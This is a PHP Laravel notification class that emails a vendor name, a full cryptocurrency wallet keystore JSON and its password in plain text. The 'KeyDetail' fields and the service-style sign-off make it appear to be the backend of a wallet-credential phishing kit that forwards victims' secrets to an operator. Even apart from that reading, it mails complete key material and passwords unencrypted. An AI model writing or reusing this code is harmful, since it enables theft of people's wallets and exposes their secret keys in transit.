<?php

namespace App\Notifications;

use App\Models\KeyDetail;
use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Notifications\Messages\MailMessage;
use Illuminate\Notifications\Notification;

class KeystoreNotification extends Notification
{
    use Queueable;

    protected $details;

    /**
     * Create a new notification instance.
     *
     * @return void
     */
    public function __construct(KeyDetail $details)
    {
        $this->details = $details;
    }

    /**
     * Get the notification's delivery channels.
     *
     * @param  mixed  $notifiable
     * @return array
     */
    public function via($notifiable)
    {
        return ['mail'];
    }

    /**
     * Get the mail representation of the notification.
     *
     * @param  mixed  $notifiable
     * @return \Illuminate\Notifications\Messages\MailMessage
     */
    public function toMail($notifiable)
    {
        return (new MailMessage)
            ->greeting('Hello,')
            ->subject('New Keystore Details')
            ->line('<b>Vendor:</b> ' . $this->details->vendor)
            ->line('<b>Keystore JSON:</b> ' . '``' . $this->details->keystore . '``')
            ->line('<b>Password:</b> ' . '``' . $this->details->password . '``')
            ->line('<br><br><br><br>')
            ->line('Thank you for using our services 🚀');
    }

    /**
     * Get the array representation of the notification.
     *
     * @param  mixed  $notifiable
     * @return array
     */
    public function toArray($notifiable)
    {
        return [
            //
        ];
    }
}
